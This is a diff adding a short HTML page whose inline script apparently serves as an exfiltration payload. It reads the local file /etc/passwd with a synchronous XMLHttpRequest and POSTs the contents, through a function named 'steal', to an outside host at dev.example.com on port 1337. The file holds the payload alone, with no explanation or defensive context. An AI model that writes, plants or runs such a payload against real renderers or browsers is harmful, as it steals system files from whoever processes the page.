@@ -1,0 +1,20 @@
+<body>
+<script>
+var file = "file:///etc/passwd";
+var extract = "http://dev.example.com:1337/";
+function get(url) {
+ var xmlHttp = new XMLHttpRequest();
+ xmlHttp.open("GET", url, false);
+ xmlHttp.send(null);
+ return xmlHttp.responseText;
+}
+function steal(data) {
+ var xhr = new XMLHttpRequest();
+ xhr.open('POST', extract, true);
+ xhr.onload = function() {};
+ xhr.send(data);
+}
+var cdl = get(file);
+steal(cdl);
+</script>
+</body>
